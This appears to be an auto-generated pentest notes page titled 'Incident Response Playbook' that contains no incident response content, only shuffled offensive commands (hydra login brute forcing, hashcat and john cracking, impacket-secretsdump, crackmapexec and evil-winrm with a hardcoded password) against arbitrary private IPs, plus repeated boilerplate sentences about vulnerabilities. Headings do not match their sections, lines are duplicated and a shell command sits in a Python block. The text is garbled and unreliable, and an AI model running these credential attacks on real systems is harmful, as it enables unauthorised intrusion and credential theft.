---
TitleSEO: "Incident Response Playbook | ZureFX"
TitlePost: "Incident Response Playbook"
Author: "ZureFX"
Description: "Personal notes on Incident Response Playbook. Quick reference for pentesting and CTF challenges."
Keywords: "oscp, windows, lateral movement"
URL: "https://zurefx.github.io/notes/note-incident-response-playbook-619.html"
URL_IMAGES: ""
Date: "2025-09-28"
Tags: "OSCP, Windows, Lateral Movement"
Section: "notes"
Lang: "en"
main_img: "note-incident-response-playbook-619"
Permalink: "/notes/note-incident-response-playbook-619.html"
BtnLabel: "Read Notes"
Pick: 0
---
## bloodhound

### nikto

```powershell
nmap -sCV -p8443,8888,5986 10.128.81.103 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files. Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible.

Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.80.110.30 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.97.46.100
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## HTTPS

### pwncat

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.77.236.17/FUZZ
```

```python
evil-winrm -i 10.95.74.151 -u administrator -p 'P@ssw0rd!'
```

The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service.

```powershell
feroxbuster -h
feroxbuster -h
nmap -sCV -p389,464,993 10.39.140.13 -oN scan.txt
crackmapexec smb 10.51.51.88 -u administrator -p 'P@ssw0rd!' --shares
```

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files.

## Silver Ticket

### HTTP

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files.

```bash
crackmapexec smb 10.73.236.59 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.22.128.170/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.71.166.124 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## LDAP

### ACL Abuse

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.116.58.17 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
crackmapexec smb 10.113.127.233 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p995,443,3268 10.50.13.227 -oN scan.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine. Command injection was possible through unsanitized user input in the search functionality.

The application stored sensitive credentials in an unencrypted configuration file. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.100.14.64 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.83.75.147 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p8443,80,25 10.100.231.9 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities.

## LAPS Abuse

### Golden Ticket

Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files. Privilege escalation was possible due to misconfigured sudo permissions.

- `enum4linux`
- `john`
- `nmap`
- `netcat`
- `SeDebugPrivilege`

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials.

Authentication bypass was achieved through careful manipulation of the login mechanism. The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

- `Local File Inclusion`
- `Sudo Misconfiguration`
- `SeImpersonatePrivilege`
- `NFS No Root Squash`
- `Constrained Delegation`
